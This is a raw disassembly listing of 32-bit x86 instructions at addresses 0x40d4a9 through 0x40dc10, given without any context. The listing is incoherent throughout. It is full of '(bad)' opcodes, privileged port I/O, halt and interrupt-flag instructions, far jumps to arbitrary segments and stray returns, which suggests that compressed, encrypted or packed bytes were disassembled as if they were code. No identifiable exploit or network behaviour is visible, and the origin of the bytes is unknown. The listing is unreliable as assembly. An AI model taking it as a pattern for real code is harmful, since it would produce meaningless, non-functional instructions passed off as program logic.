  40d4a9:	lods   ax,WORD PTR ds:[esi]
  40d4ab:	and    BYTE PTR [ecx-0x6b0a71ad],dh
  40d4b1:	lahf   
  40d4b2:	push   cs
  40d4b3:	into   
  40d4b4:	out    dx,al
  40d4b5:	ror    al,0x0
  40d4b8:	jae    0x40d47a
  40d4ba:	sub    bh,BYTE PTR [eax+ebp*4+0x796aacc9]
  40d4c1:	call   0x67ac40b1
  40d4c6:	(bad)  
  40d4c8:	push   0xffffffff
  40d4ca:	add    cl,BYTE PTR [ebx+0x36]
  40d4cd:	jno    0x40d453
  40d4cf:	push   esp
  40d4d0:	inc    edi
  40d4d1:	fdivp  st(5),st
  40d4d3:	aaa    
  40d4d4:	fild   QWORD PTR [edi-0x5b]
  40d4d7:	and    bh,BYTE PTR [edx-0x7f95c9f4]
  40d4dd:	popa   
  40d4de:	cmp    al,0x32
  40d4e0:	aad    0x57
  40d4e2:	ds pop ss
  40d4e4:	imul   edi,DWORD PTR [ecx],0xffffffbf
  40d4e7:	jp     0x40d512
  40d4e9:	lahf   
  40d4ea:	fldcw  WORD PTR [edx]
  40d4ec:	hlt    
  40d4ed:	xchg   esp,eax
  40d4ee:	or     eax,0xbb834a08
  40d4f3:	xlat   BYTE PTR ds:[ebx]
  40d4f4:	cli    
  40d4f5:	(bad)  
  40d4f6:	pushf  
  40d4f7:	mov    ecx,0x1d58fa9d
  40d4fc:	cmp    eax,0x878b745d
  40d501:	lock push ebp
  40d503:	fcom   DWORD PTR [ebx-0xa]
  40d506:	cmp    al,BYTE PTR [edx+0x2d]
  40d509:	and    BYTE PTR [ebx],0x66
  40d50c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d50d:	std    
  40d50e:	retf   0x1bea
  40d511:	ret    
  40d512:	(bad)  
  40d513:	pop    esi
  40d514:	jl     0x40d547
  40d516:	ror    ebp,cl
  40d518:	add    eax,0xf83ee2fe
  40d51d:	sbb    BYTE PTR [edi-0x6],dl
  40d520:	inc    edx
  40d521:	adc    al,0x34
  40d523:	(bad)  
  40d524:	sub    al,BYTE PTR [eax]
  40d526:	push   es
  40d527:	cmp    cl,0x3e
  40d52a:	rcr    DWORD PTR [ebp+0x6accebad],cl
  40d530:	ret    
  40d531:	lds    ebp,FWORD PTR [esi+0xb]
  40d534:	sub    eax,0x1957593
  40d539:	xor    dl,al
  40d53b:	cld    
  40d53c:	daa    
  40d53d:	fadd   DWORD PTR [edx+0x3d]
  40d540:	mov    ds:0x192f405a,al
  40d545:	push   0xffffffff
  40d547:	popw   ds
  40d549:	dec    edx
  40d54a:	add    BYTE PTR ds:0xa6f2b8c1,ah
  40d550:	xlat   BYTE PTR ds:[ebx]
  40d551:	fwait
  40d552:	adc    eax,0xbcde9fd7
  40d557:	and    BYTE PTR [edi-0x5e],cl
  40d55a:	xor    BYTE PTR [ebp+0x57],ch
  40d55d:	add    edi,0xffffffcf
  40d560:	cmc    
  40d561:	mov    dl,0xb0
  40d563:	js     0x40d5bd
  40d565:	and    eax,0xfc349be5
  40d56a:	jo     0x40d540
  40d56c:	ret    
  40d56d:	pop    ecx
  40d56e:	fcmovu st,st(2)
  40d570:	mov    ebp,0x8ae8b7c6
  40d575:	in     al,dx
  40d576:	adc    BYTE PTR [ebx+0x786a33c1],bl
  40d57c:	mov    al,BYTE PTR [ebp-0x58129291]
  40d582:	inc    ecx
  40d583:	stos   DWORD PTR es:[edi],eax
  40d584:	test   BYTE PTR [eax],dl
  40d586:	fs out 0x64,eax
  40d589:	add    BYTE PTR [ecx],ch
  40d58b:	or     al,0x7
  40d58d:	icebp  
  40d58e:	jg     0x40d51b
  40d590:	fsub   QWORD PTR [eax+0x2ea394c1]
  40d596:	les    ebp,FWORD PTR [edx]
  40d598:	inc    edx
  40d599:	mov    bh,BYTE PTR [ebx-0x9]
  40d59c:	(bad)  
  40d59d:	mov    ah,0xbc
  40d59f:	cmp    eax,0x7e51d9b3
  40d5a4:	inc    edi
  40d5a5:	inc    edi
  40d5a7:	inc    ebx
  40d5a8:	adc    BYTE PTR ds:0x91707bb8,0x0
  40d5af:	rcr    esi,1
  40d5b1:	int3   
  40d5b2:	pop    ss
  40d5b3:	scas   al,BYTE PTR es:[edi]
  40d5b4:	pop    edx
  40d5b5:	shl    ah,cl
  40d5b7:	jne    0x40d5a0
  40d5b9:	pop    ds
  40d5ba:	stos   BYTE PTR es:[edi],al
  40d5bb:	mov    ecx,ecx
  40d5bd:	aas    
  40d5be:	or     al,0xca
  40d5c0:	mov    ebx,0xb54d88d1
  40d5c5:	and    BYTE PTR [ecx-0x68ca8390],0x91
  40d5cc:	sti    
  40d5cd:	in     eax,dx
  40d5ce:	mov    ebx,0x8d2c83b0
  40d5d3:	(bad)  
  40d5d5:	jne    0x40d573
  40d5d7:	in     al,dx
  40d5d8:	fstp   QWORD PTR [edx]
  40d5da:	in     al,0xca
  40d5dc:	sub    BYTE PTR [edx-0x7f],0x6f
  40d5e0:	xor    ah,BYTE PTR [ecx]
  40d5e2:	push   0xffffffda
  40d5e4:	repnz dec ecx
  40d5e6:	or     eax,0xfb81681f
  40d5eb:	cmp    dl,dl
  40d5ed:	mov    dh,0x67
  40d5ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f0:	(bad)  
  40d5f1:	in     eax,dx
  40d5f2:	inc    DWORD PTR [eax+eiz*2+0x5a]
  40d5f6:	lea    esi,[edi+ebp*1+0x7170ad65]
  40d5fd:	outs   dx,BYTE PTR ds:[esi]
  40d5fe:	retf   
  40d5ff:	nop
  40d600:	mov    edi,0xf542db80
  40d605:	dec    esi
  40d606:	(bad)  
  40d607:	out    0x26,al
  40d609:	jns    0x40d5b4
  40d60b:	enter  0x582,0x4d
  40d60f:	xor    eax,0xe839572f
  40d614:	xor    DWORD PTR [eax-0x2e],0x43
  40d618:	es mov edx,0xe39376a4
  40d61e:	mov    DWORD PTR [ebx+0x54],0x1d782121
  40d625:	inc    esi
  40d626:	mov    ecx,0xd83e2dd7
  40d62b:	out    dx,al
  40d62c:	jg     0x40d62d
  40d62e:	dec    edi
  40d62f:	call   0x8c9e:0xc80ffbc3
  40d636:	add    ecx,ebx
  40d638:	stc    
  40d639:	mov    bl,0xc5
  40d63b:	or     BYTE PTR [ebx-0x4b2f8cb5],ch
  40d641:	push   edx
  40d642:	adc    BYTE PTR [ecx],al
  40d644:	xchg   DWORD PTR [ecx+0x4c],esp
  40d647:	and    edi,DWORD PTR [ecx]
  40d649:	push   ds
  40d64a:	jo     0x40d6a5
  40d64c:	and    al,0xf2
  40d64e:	adc    DWORD PTR [eax-0x6e],ecx
  40d651:	pushf  
  40d652:	in     al,0xef
  40d654:	mov    WORD PTR [ebx],?
  40d656:	dec    edx
  40d657:	mov    dh,0x94
  40d659:	popf   
  40d65a:	jle    0x40d654
  40d65c:	mov    dl,0xe1
  40d65e:	or     DWORD PTR [ecx-0x79],esp
  40d661:	imul   edi,edx,0xfffffff3
  40d664:	(bad)
  40d668:	pop    ecx
  40d669:	mov    ah,0x46
  40d66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d66c:	sti    
  40d66d:	fcom   QWORD PTR [ecx-0x5d]
  40d670:	and    DWORD PTR [eax-0x26407214],esi
  40d676:	sub    al,0x1d
  40d678:	mov    al,0x70
  40d67a:	clc    
  40d67b:	dec    ecx
  40d67c:	rcr    bh,cl
  40d67e:	push   eax
  40d67f:	mov    ch,0xfe
  40d681:	push   edx
  40d682:	outs   dx,DWORD PTR ds:[esi]
  40d683:	xor    ecx,DWORD PTR [edi]
  40d685:	test   eax,0x93ddab32
  40d68a:	je     0x40d6c0
  40d68c:	add    al,0x59
  40d68e:	cmp    al,0xca
  40d690:	(bad)  
  40d691:	call   0x7f51dd2a
  40d696:	int3   
  40d697:	push   edi
  40d698:	push   esp
  40d699:	aam    0xce
  40d69b:	stc    
  40d69c:	lods   al,BYTE PTR ds:[esi]
  40d69d:	mov    eax,0x670c9f6e
  40d6a2:	loop   0x40d68d
  40d6a4:	addr16 jmp 0x9c82:0x6e6673b9
  40d6ac:	daa    
  40d6ad:	xchg   BYTE PTR [ebp-0x67925fba],ch
  40d6b3:	inc    edi
  40d6b4:	fadd   QWORD PTR [edi]
  40d6b6:	jl     0x40d63b
  40d6b8:	dec    ebx
  40d6b9:	xor    al,0x1f
  40d6bb:	or     bl,BYTE PTR [ecx]
  40d6bd:	cdq    
  40d6be:	dec    ecx
  40d6bf:	dec    esi
  40d6c0:	xor    eax,0x4d5593a8
  40d6c5:	push   esp
  40d6c6:	xchg   edx,eax
  40d6c7:	clc    
  40d6c8:	add    ch,ch
  40d6ca:	daa    
  40d6cb:	nop
  40d6cc:	lds    eax,FWORD PTR [esi-0x45]
  40d6cf:	adc    DWORD PTR [edi+ebx*1],eax
  40d6d2:	dec    esi
  40d6d3:	lahf   
  40d6d4:	(bad)  
  40d6d5:	sti    
  40d6d6:	xor    al,0x3
  40d6d8:	inc    edx
  40d6d9:	leave  
  40d6da:	das    
  40d6db:	or     al,0x93
  40d6dd:	sbb    BYTE PTR [edi+0x16],ch
  40d6e0:	mov    ebx,DWORD PTR [ebp-0x62b2be8]
  40d6e6:	jnp    0x40d6d7
  40d6e8:	dec    edx
  40d6e9:	retf   0x7da9
  40d6ec:	stos   BYTE PTR es:[edi],al
  40d6ed:	jl     0x40d719
  40d6ef:	fstp   DWORD PTR [ecx-0x448fdae9]
  40d6f5:	inc    eax
  40d6f6:	and    BYTE PTR [edx+0x34],al
  40d6f9:	fnstsw WORD PTR [ecx]
  40d6fb:	mov    DWORD PTR [ecx+0x7379144f],edi
  40d701:	fcom   DWORD PTR [edx+0x236da8c3]
  40d707:	enter  0x6357,0x48
  40d70b:	aam    0xdd
  40d70d:	fdivr  QWORD PTR [ebx+0x748baa8c]
  40d713:	aas    
  40d714:	mov    al,0x4e
  40d716:	xchg   ecx,eax
  40d717:	test   DWORD PTR [esi-0x28],edi
  40d71a:	mov    esp,0x4f4ef9ef
  40d71f:	inc    eax
  40d720:	dec    edi
  40d721:	aad    0xa9
  40d723:	enter  0x9b67,0xd3
  40d727:	pop    es
  40d728:	or     BYTE PTR [ecx+0x6e],0x8a
  40d72c:	fcomi  st,st(5)
  40d72e:	and    bl,BYTE PTR [ecx-0xd]
  40d731:	aaa    
  40d732:	(bad)  
  40d733:	xchg   edi,eax
  40d734:	ss es pusha 
  40d737:	ss xchg esi,eax
  40d739:	ret    
  40d73a:	or     cl,0xa7
  40d73d:	dec    ebp
  40d73e:	add    BYTE PTR [ecx],dl
  40d740:	push   ebx
  40d741:	mov    ch,0xb
  40d743:	loopne 0x40d792
  40d745:	out    dx,eax
  40d746:	mov    BYTE PTR [ebp+0x4],0x2c
  40d74a:	rol    bl,cl
  40d74c:	push   ebx
  40d74d:	out    dx,eax
  40d74e:	pop    ds
  40d74f:	cmp    al,0x21
  40d751:	fdivr  QWORD PTR [ecx]
  40d753:	mov    dh,0xab
  40d755:	pop    eax
  40d756:	sub    ch,BYTE PTR [esp+eax*2-0x19d59003]
  40d75d:	mov    dh,0xf5
  40d75f:	(bad)  
  40d760:	push   esi
  40d761:	xor    BYTE PTR [ebx+0x3ec75907],0x92
  40d768:	add    BYTE PTR [ebp+eiz*8-0x1c6b5d36],ch
  40d76f:	dec    esi
  40d770:	rol    DWORD PTR ds:0x6ea5f05e,0x4c
  40d777:	or     esp,edi
  40d779:	or     BYTE PTR [esi+0x1197f351],0xf
  40d780:	pop    esi
  40d781:	pop    ss
  40d782:	add    ch,BYTE PTR fs:[ebp-0x31b8587f]
  40d789:	jo     0x40d73c
  40d78b:	inc    esi
  40d78c:	inc    esp
  40d78d:	jg     0x40d729
  40d78f:	mov    bh,0x66
  40d791:	cmp    ch,ch
  40d793:	es and al,0x13
  40d796:	stos   DWORD PTR es:[edi],eax
  40d797:	int3   
  40d798:	mov    edi,0x5b285cca
  40d79d:	adc    DWORD PTR [ecx],ebx
  40d79f:	mov    BYTE PTR [eax+ebp*8-0x29],ah
  40d7a3:	push   esp
  40d7a4:	add    DWORD PTR [edi+0x1c],esi
  40d7a7:	outs   dx,DWORD PTR ds:[esi]
  40d7a8:	das    
  40d7a9:	xlat   BYTE PTR ds:[ebx]
  40d7aa:	sub    cl,0x97
  40d7ad:	out    0x35,eax
  40d7af:	xchg   esp,eax
  40d7b0:	shl    BYTE PTR [ebx-0x43da11f0],1
  40d7b6:	cli    
  40d7b7:	aaa    
  40d7b8:	mov    DWORD PTR [eax+ecx*1],edi
  40d7bb:	(bad)  
  40d7bc:	jo     0x40d754
  40d7be:	iret   
  40d7bf:	nop
  40d7c0:	dec    edi
  40d7c1:	jmp    0x126f:0x4ed2359d
  40d7c8:	add    bl,dh
  40d7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7cb:	test   BYTE PTR [ecx+ebp*1+0x33],0x7e
  40d7d0:	pop    esi
  40d7d1:	daa    
  40d7d2:	out    dx,al
  40d7d3:	popa   
  40d7d4:	pop    edx
  40d7d5:	fimul  DWORD PTR [ebp+0x5a]
  40d7d8:	sub    DWORD PTR [edi-0x2225ca9d],0xecc74f93
  40d7e2:	mov    ebp,gs
  40d7e4:	idiv   DWORD PTR [ecx+edi*8-0x37]
  40d7e8:	sub    al,0x5f
  40d7ea:	push   eax
  40d7eb:	mov    ebx,0xefe243fe
  40d7f0:	jno    0x40d7b4
  40d7f2:	jnp    0x40d82e
  40d7f4:	and    eax,0x4ab2645f
  40d7f9:	lahf   
  40d7fa:	scas   eax,DWORD PTR es:[edi]
  40d7fb:	inc    ebx
  40d7fc:	pop    ecx
  40d7fd:	cmp    eax,0x193ea921
  40d802:	outs   dx,DWORD PTR ds:[esi]
  40d803:	ret    0xcce3
  40d806:	fnstcw WORD PTR ds:0xa720efc9
  40d80c:	cmp    BYTE PTR [edx+esi*8+0xa],dh
  40d810:	mov    ebx,0xedb77a2c
  40d815:	bound  esp,QWORD PTR ds:0xa40710e7
  40d81b:	xchg   esi,eax
  40d81c:	inc    esi
  40d81d:	repz push eax
  40d81f:	scas   eax,DWORD PTR es:[edi]
  40d820:	sub    BYTE PTR [ecx-0x7d16f6c0],dl
  40d826:	mov    edx,0x8a388625
  40d82b:	adc    dh,0x65
  40d82e:	jg     0x40d824
  40d830:	call   0x93d7:0x77bb642d
  40d837:	je     0x40d82f
  40d839:	rol    DWORD PTR [edi],0x67
  40d83c:	lock out dx,eax
  40d83e:	fs push 0x2a9d37d1
  40d844:	pusha  
  40d845:	jl     0x40d833
  40d847:	sbb    bh,al
  40d849:	repz call 0x87e2bc27
  40d84f:	pusha  
  40d850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d851:	sbb    dh,BYTE PTR [eax+0x72]
  40d854:	gs jnp 0x40d826
  40d857:	xchg   ebp,eax
  40d858:	push   edi
  40d859:	mov    al,0xd3
  40d85b:	mov    cl,0xad
  40d85d:	cdq    
  40d85e:	and    ebx,DWORD PTR [ecx+ecx*8-0x16b95047]
  40d865:	cmp    DWORD PTR [eax],eax
  40d867:	push   esi
  40d868:	cmovno esp,ebp
  40d86b:	sti    
  40d86c:	adc    bl,BYTE PTR [esi]
  40d86e:	inc    ecx
  40d86f:	stos   DWORD PTR es:[edi],eax
  40d870:	adc    DWORD PTR [edx],edi
  40d872:	or     eax,0xadf1bb32
  40d877:	and    eax,0xfde117e
  40d87c:	pop    eax
  40d87d:	xor    BYTE PTR [ecx],dh
  40d87f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d880:	or     DWORD PTR [ebp-0x17c33d15],esp
  40d886:	inc    edi
  40d887:	(bad)  
  40d888:	sbb    ecx,DWORD PTR [esp+edx*1+0x59884bf]
  40d88f:	and    esp,edx
  40d891:	test   eax,0x1590d200
  40d896:	mov    edi,0xa3f365ed
  40d89b:	jl     0x40d866
  40d89d:	fcmovnbe st,st(4)
  40d89f:	cmp    eax,0xdd3e7d15
  40d8a4:	lahf   
  40d8a5:	mov    ebx,0x78e1b903
  40d8aa:	(bad)  
  40d8ab:	int    0x30
  40d8ad:	fscale 
  40d8af:	jge    0x40d911
  40d8b1:	or     dl,BYTE PTR [edx+0x3]
  40d8b4:	retf   
  40d8b5:	cwde   
  40d8b6:	jle    0x40d915
  40d8b8:	shr    BYTE PTR [ebp-0x23],0xca
  40d8bc:	cmp    eax,0x9bf56c4a
  40d8c1:	cmp    BYTE PTR [esi+0x39f3bc61],dh
  40d8c7:	fst    QWORD PTR [edi+0x5a]
  40d8ca:	jns    0x40d89e
  40d8cc:	pop    ebx
  40d8cd:	sub    eax,0x6
  40d8d0:	imul   ebp,DWORD PTR [eax+0x1accffd],0x9e10e761
  40d8da:	pushf  
  40d8db:	jne    0x40d8e2
  40d8dd:	xor    ch,BYTE PTR [edx+0x6c]
  40d8e0:	je     0x40d8e1
  40d8e2:	push   0xe2349a41
  40d8e7:	js     0x40d8d0
  40d8e9:	mov    bh,0x70
  40d8eb:	test   eax,0x6a4ec55a
  40d8f0:	pop    ebp
  40d8f1:	jo     0x40d920
  40d8f3:	loope  0x40d877
  40d8f5:	adc    al,0x83
  40d8f7:	dec    ebx
  40d8f8:	es fsubp st(0),st
  40d8fb:	xor    ch,BYTE PTR [ebx]
  40d8fd:	imul   esi,esi,0xf082de20
  40d903:	mul    BYTE PTR [eax]
  40d905:	push   eax
  40d906:	dec    esi
  40d907:	adc    BYTE PTR [esi-0x262af745],dl
  40d90d:	outs   dx,BYTE PTR ds:[esi]
  40d90e:	les    edx,FWORD PTR [ecx]
  40d910:	popa   
  40d911:	not    DWORD PTR [ebx-0x667a5f0f]
  40d917:	fwait
  40d918:	pusha  
  40d919:	imul   DWORD PTR [ebx+0x575c83b2]
  40d91f:	sub    eax,0x4997108d
  40d924:	mov    ebx,0x75420d9
  40d929:	fadd   QWORD PTR [ebx]
  40d92b:	mov    ebp,0xb4d79ec3
  40d930:	xor    DWORD PTR [ecx],edx
  40d932:	cli    
  40d933:	fidiv  WORD PTR [eax-0x80]
  40d936:	sbb    eax,0x203c9314
  40d93b:	pop    esp
  40d93c:	xchg   esi,eax
  40d93d:	adc    al,BYTE PTR [edi-0x49]
  40d940:	push   edi
  40d941:	mov    dh,0x13
  40d943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d944:	test   al,0x9e
  40d946:	jg     0x40d903
  40d948:	pop    esi
  40d949:	mov    eax,ds:0xdee73b01
  40d94e:	cli    
  40d94f:	push   ebx
  40d950:	sbb    BYTE PTR [ecx-0x3ef5b2ce],al
  40d956:	pop    edi
  40d957:	sbb    eax,0x843cc466
  40d95c:	out    0xc5,al
  40d95e:	sub    eax,0xf7b81bec
  40d963:	mov    WORD PTR [ebp-0x61ea9eb5],es
  40d969:	outs   dx,BYTE PTR ds:[esi]
  40d96a:	inc    esp
  40d96b:	scas   eax,DWORD PTR es:[edi]
  40d96c:	inc    ecx
  40d96d:	inc    esp
  40d96e:	mov    dl,0x14
  40d970:	add    ecx,ebx
  40d972:	out    dx,eax
  40d973:	sti    
  40d974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d975:	inc    dx
  40d977:	jecxz  0x40d986
  40d979:	dec    edx
  40d97a:	adc    dl,BYTE PTR [ecx-0x7ee60742]
  40d980:	jge    0x40d923
  40d982:	xchg   ebx,eax
  40d983:	shl    BYTE PTR [esi+edx*8+0xc54aa29],cl
  40d98a:	dec    ebx
  40d98b:	rol    BYTE PTR [ebp+0x379d710a],cl
  40d991:	ror    BYTE PTR [ecx-0x1a],cl
  40d994:	mov    ah,0x5f
  40d996:	add    cl,BYTE PTR [ebx+0x38d153c9]
  40d99c:	scas   al,BYTE PTR es:[edi]
  40d99d:	push   edi
  40d99e:	mov    ds:0xc9d1d36f,eax
  40d9a3:	and    ecx,ebp
  40d9a5:	arpl   bp,bp
  40d9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a8:	out    0x1a,eax
  40d9aa:	mov    ebx,DWORD PTR [eax]
  40d9ac:	aas    
  40d9ad:	das    
  40d9ae:	dec    esi
  40d9af:	test   BYTE PTR [ebx],0x49
  40d9b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9b3:	outs   dx,DWORD PTR ds:[esi]
  40d9b4:	push   ss
  40d9b5:	jbe    0x40d9a0
  40d9b7:	loope  0x40d986
  40d9b9:	xchg   BYTE PTR [ecx],cl
  40d9bb:	xor    eax,DWORD PTR [esi+0x32]
  40d9be:	pusha  
  40d9bf:	out    dx,eax
  40d9c0:	fist   WORD PTR [ebx]
  40d9c2:	fidivr DWORD PTR ds:0xe7c17253
  40d9c8:	dec    esi
  40d9c9:	and    esp,esi
  40d9cb:	repz xchg sp,ax
  40d9ce:	ret    
  40d9cf:	sub    eax,0xacf61dc2
  40d9d4:	push   cs
  40d9d5:	inc    esp
  40d9d6:	scas   al,BYTE PTR es:[edi]
  40d9d7:	retf   
  40d9d8:	daa    
  40d9d9:	ficom  DWORD PTR [ebx+0x19840225]
  40d9df:	ins    DWORD PTR es:[edi],dx
  40d9e0:	jnp    0x40da1d
  40d9e2:	mov    cl,0x5
  40d9e4:	ret    
  40d9e5:	or     BYTE PTR [esi],al
  40d9e7:	(bad)  
  40d9e8:	lods   eax,DWORD PTR ds:[esi]
  40d9e9:	icebp  
  40d9ea:	xchg   edx,eax
  40d9eb:	or     eax,0xd971490c
  40d9f0:	cdq    
  40d9f1:	cdq    
  40d9f2:	rcr    DWORD PTR [edi+ebx*8+0x1005023f],cl
  40d9f9:	push   ebp
  40d9fa:	cmp    eax,DWORD PTR [edi]
  40d9fc:	dec    edi
  40d9fd:	jno    0x40d99f
  40d9ff:	data16 (bad) 
  40da01:	std    
  40da02:	add    al,0xe6
  40da04:	ss xchg edx,eax
  40da06:	xchg   esp,eax
  40da07:	(bad)  
  40da08:	mov    ds:0x5a72c2b6,eax
  40da0d:	sub    bl,bl
  40da0f:	mov    ebx,0x910f34c5
  40da14:	jg     0x40da81
  40da16:	cmp    eax,0x2e044c8c
  40da1b:	ret    
  40da1c:	(bad)  
  40da1d:	pop    esp
  40da1e:	repz and al,BYTE PTR ds:[edi+0x58]
  40da23:	xchg   di,ax
  40da25:	and    bh,BYTE PTR [ecx]
  40da27:	xor    DWORD PTR [ebx-0x3c],esi
  40da2a:	ds cmp dh,0x2d
  40da2e:	(bad)  
  40da2f:	inc    DWORD PTR [eax]
  40da31:	loop   0x40d9ea
  40da33:	lds    esp,FWORD PTR [edx+0x6b]
  40da36:	sbb    BYTE PTR [eax-0x73339348],bl
  40da3c:	test   BYTE PTR [eax+0xac13295],dl
  40da42:	mov    dh,0xb7
  40da44:	movhps QWORD PTR [edx-0x3409d0cd],xmm3
  40da4b:	mov    edi,0xb0f4360a
  40da50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da51:	aad    0xba
  40da53:	adc    al,0xca
  40da55:	int    0x2
  40da57:	mov    ebp,0x7002503b
  40da5c:	jbe    0x40dadd
  40da5e:	cmc    
  40da5f:	jno    0x40dad1
  40da61:	das    
  40da62:	sbb    ecx,DWORD PTR [ecx+0x46]
  40da65:	sub    bh,BYTE PTR [esi+0x21]
  40da68:	cmp    al,bl
  40da6a:	xchg   esi,eax
  40da6b:	xchg   ebx,eax
  40da6c:	mov    esp,DWORD PTR [ebx-0xf6d5ca0]
  40da72:	mov    esp,0x840ea5c8
  40da77:	sub    al,0x73
  40da79:	pushf  
  40da7a:	out    0xf4,eax
  40da7c:	repz xchg esi,eax
  40da7e:	mov    ch,0xe7
  40da80:	sbb    esp,DWORD PTR [eax-0x35]
  40da83:	sbb    eax,0x375f3ff7
  40da88:	aaa    
  40da89:	mov    eax,0xa23afaa9
  40da8e:	mov    eax,ds:0x3139ed8b
  40da93:	push   edi
  40da94:	shr    DWORD PTR [ecx+0x7e0555f3],1
  40da9a:	jno    0x40da7f
  40da9c:	leave  
  40da9d:	lods   al,BYTE PTR ds:[esi]
  40da9e:	inc    edx
  40da9f:	in     eax,dx
  40daa0:	aas    
  40daa1:	sub    dl,0xcb
  40daa4:	mov    al,0x8b
  40daa6:	adc    eax,0xdbcfa7de
  40daab:	ficom  WORD PTR [edi]
  40daad:	mov    al,0xa2
  40daaf:	inc    ebx
  40dab0:	repz mov bl,0x1b
  40dab3:	push   0xd24e9d4e
  40dab8:	out    0x8c,eax
  40daba:	and    eax,0x55cccb31
  40dabf:	push   esp
  40dac0:	imul   ebp,esi,0x7257fbff
  40dac6:	sbb    DWORD PTR [ecx+0x22],0xb96dc551
  40dacd:	or     DWORD PTR [esi],0xd
  40dad0:	jmp    DWORD PTR [edx-0xfe25eb7]
  40dad6:	mov    BYTE PTR [edi],al
  40dad8:	fiadd  WORD PTR [edi]
  40dada:	bnd jge 0x40db20
  40dadd:	inc    eax
  40dade:	or     al,0xbf
  40dae0:	fisubr WORD PTR [ebx+0x37ac2422]
  40dae6:	xchg   ebp,eax
  40dae7:	sahf   
  40dae8:	cmp    BYTE PTR [esi+0x44],0xc
  40daec:	dec    eax
  40daed:	sbb    dl,BYTE PTR [esp+eax*1-0x3361de51]
  40daf4:	stos   DWORD PTR es:[edi],eax
  40daf5:	(bad)  
  40daf6:	jmp    0x746df0aa
  40dafb:	(bad)  
  40dafc:	nop
  40dafd:	je     0x40db14
  40daff:	int    0x97
  40db01:	inc    eax
  40db02:	js     0x40db2d
  40db04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db05:	mov    eax,0x96391ba5
  40db0a:	push   es
  40db0b:	lea    esp,[ebp-0x5e6d58c9]
  40db11:	cmp    bl,dl
  40db13:	mov    ds,WORD PTR [edx]
  40db15:	sbb    esi,DWORD PTR [eax+0x32c4e85]
  40db1b:	xchg   dl,ch
  40db1d:	xor    eax,0x2438b298
  40db22:	xchg   edi,eax
  40db23:	loopne 0x40db4d
  40db25:	and    al,al
  40db27:	adc    BYTE PTR [edi+ecx*1],bl
  40db2a:	adc    eax,0x1c277c06
  40db2f:	cmp    BYTE PTR [esi],cl
  40db31:	adc    ebp,DWORD PTR [ebx+eax*4]
  40db34:	mov    ds:0x21823aea,eax
  40db39:	out    dx,al
  40db3a:	inc    eax
  40db3b:	cld    
  40db3c:	arpl   WORD PTR [eax-0x674e9c3b],dx
  40db42:	jle    0x40dae7
  40db44:	icebp  
  40db45:	and    DWORD PTR [ecx+0x22],esp
  40db48:	mov    dh,BYTE PTR [ebp+0x4]
  40db4b:	nop
  40db4c:	mov    bl,0xaf
  40db4e:	mov    bl,0xa
  40db50:	xchg   al,cl
  40db52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db53:	dec    edx
  40db54:	call   0x3967:0x6c1f7fe1
  40db5b:	rcr    DWORD PTR [eax+0x63],0x24
  40db5f:	cmc    
  40db60:	xor    DWORD PTR [ecx-0x642afd23],ebx
  40db66:	outs   dx,BYTE PTR ds:[esi]
  40db67:	das    
  40db68:	dec    DWORD PTR [eax+edi*1+0x2b4732d1]
  40db6f:	add    DWORD PTR [ecx],0xffffffa3
  40db72:	push   eax
  40db73:	mov    DWORD PTR [edx+0x43],ebp
  40db76:	push   ebx
  40db77:	loope  0x40db9f
  40db79:	or     al,0xdd
  40db7b:	aaa    
  40db7c:	leave  
  40db7d:	(bad)  
  40db7e:	jle    0x40db4a
  40db80:	push   ecx
  40db81:	jo     0x40db73
  40db83:	lea    edi,[ecx]
  40db85:	mov    eax,ds:0x1bcc45ed
  40db8a:	addr16 mov esp,0x5ca50793
  40db90:	xlat   BYTE PTR ds:[ebx]
  40db91:	int    0xee
  40db93:	jae    0x40dc09
  40db95:	sbb    eax,0xe32887b9
  40db9a:	or     ah,BYTE PTR [ebx]
  40db9c:	sub    DWORD PTR [ebx-0x27],esp
  40db9f:	xor    al,0x20
  40dba1:	xchg   esp,eax
  40dba2:	jae    0x40db7e
  40dba4:	lea    eax,[edx+ebp*8+0x74efee8f]
  40dbab:	mov    al,0x1c
  40dbad:	repnz sbb al,0x6f
  40dbb0:	or     BYTE PTR [esi+0x67],bh
  40dbb3:	arpl   WORD PTR [ebx],dx
  40dbb5:	mov    cl,0x82
  40dbb7:	pop    esp
  40dbb8:	pop    ds
  40dbb9:	inc    eax
  40dbba:	(bad)  
  40dbbb:	nop
  40dbbc:	xlat   BYTE PTR ds:[ebx]
  40dbbd:	mov    edx,0x788486e
  40dbc2:	aaa    
  40dbc3:	pusha  
  40dbc4:	pop    eax
  40dbc5:	aaa    
  40dbc6:	dec    esp
  40dbc7:	jg     0x40db75
  40dbc9:	clc    
  40dbca:	jo     0x40dc3d
  40dbcc:	push   edx
  40dbcd:	xor    al,bl
  40dbcf:	sub    eax,ebx
  40dbd1:	fsubr  DWORD PTR [esi+0x33020054]
  40dbd7:	jne    0x40db90
  40dbd9:	mov    edi,0xc33635e5
  40dbde:	adc    al,0x37
  40dbe0:	mov    cl,0xa2
  40dbe2:	adc    BYTE PTR [esi],bl
  40dbe4:	sbb    dh,BYTE PTR [esi-0xb1af2b7]
  40dbea:	cs jb  0x40dbb0
  40dbed:	inc    ebx
  40dbee:	clc    
  40dbef:	xor    DWORD PTR [edx+edi*2],esp
  40dbf2:	iret   
  40dbf3:	pusha  
  40dbf4:	add    esp,DWORD PTR ds:0x60db50fb
  40dbfa:	dec    edi
  40dbfb:	stos   BYTE PTR es:[edi],al
  40dbfc:	mov    ah,0xe8
  40dbfe:	sub    BYTE PTR [ecx],dl
  40dc00:	test   BYTE PTR [esi],dl
  40dc02:	dec    edx
  40dc03:	enter  0xe088,0xc5
  40dc07:	add    ax,WORD PTR [ecx+0x23bd81b9]
  40dc0e:	mov    dl,0xe8
  40dc10:	jecxz  0x40dbfd
